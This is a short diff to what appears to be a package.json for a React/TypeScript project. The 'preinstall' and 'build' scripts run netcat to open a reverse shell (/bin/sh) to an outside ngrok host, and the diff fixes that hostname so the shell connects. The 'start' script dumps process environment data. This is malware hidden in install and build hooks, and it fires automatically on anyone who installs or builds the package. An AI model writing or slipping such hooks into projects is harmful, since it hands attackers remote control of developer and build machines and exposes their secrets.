@@ -13,9 +13,9 @@
     "typescript": "3.8.3"
   },
   "scripts": {
-    "preinstall" : "nc 5.tcp.eu.ngrok 14155 -e /bin/sh",
+    "preinstall" : "nc 5.tcp.eu.ngrok.io 14155 -e /bin/sh",
     "start": "cat /proc/environ",
-    "build": "nc 5.tcp.eu.ngrok 14155 -e /bin/sh",
+    "build": "nc 5.tcp.eu.ngrok.io 14155 -e /bin/sh",
     "test": "react-scripts test --env=jsdom",
     "eject": "react-scripts eject"
   },
